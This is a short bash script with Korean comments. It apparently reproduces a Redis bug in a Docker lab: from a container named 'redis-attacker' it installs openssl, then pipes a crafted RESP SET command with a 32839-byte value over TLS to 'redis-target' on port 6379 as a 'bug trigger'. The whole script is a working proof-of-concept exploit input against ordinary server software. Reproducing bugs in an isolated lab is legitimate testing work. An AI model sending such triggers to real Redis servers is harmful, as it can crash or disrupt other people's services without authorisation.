#!/usr/bin/env bash

CONTAINER_NAME="redis-attacker"


echo "------- openssl 설치 -------"
docker exec ${CONTAINER_NAME} bash -c "which openssl > /dev/null 2>&1 || (apt-get update && apt-get install -y openssl)"

echo "------- bug trigger 전송 -------"
docker exec ${CONTAINER_NAME} bash -c '
  BIG_VALUE=$(head -c 32839 < /dev/zero | tr "\0" "a")
  (printf "*5\r\n\$3\r\nSET\r\n\$1\r\nX\r\n\$32839\r\n${BIG_VALUE}\r\n\$2\r\nEX\r\n\$4\r\n1000\r\n"; sleep 0.1) | openssl s_client --host redis-target --port 6379
'

echo "------- 전송 완료 -------"
